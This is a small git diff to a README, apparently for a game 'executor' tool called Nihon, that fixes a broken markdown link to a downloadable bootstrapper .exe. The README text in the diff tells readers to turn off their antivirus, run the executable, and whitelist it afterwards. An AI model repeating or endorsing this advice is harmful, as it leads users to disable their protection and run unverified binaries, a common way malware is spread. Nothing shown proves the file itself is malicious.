@@ -21,4 +21,4 @@
 
 ### First, turn your anti virus off, second run the bootstrapper. Third whitelist the file on your AV.
 
-* [![button](https://cdn.discordapp.com/attachments/811025745916329984/812145123223142402/Nihon_Transparent.png)}(https://github.com/boomermc/Nihon-executor/releases/download/1.0/Nihon_Bootstrapper.exe)
+* [![button](https://cdn.discordapp.com/attachments/811025745916329984/812145123223142402/Nihon_Transparent.png)](https://github.com/boomermc/Nihon-executor/releases/download/1.0/Nihon_Bootstrapper.exe)
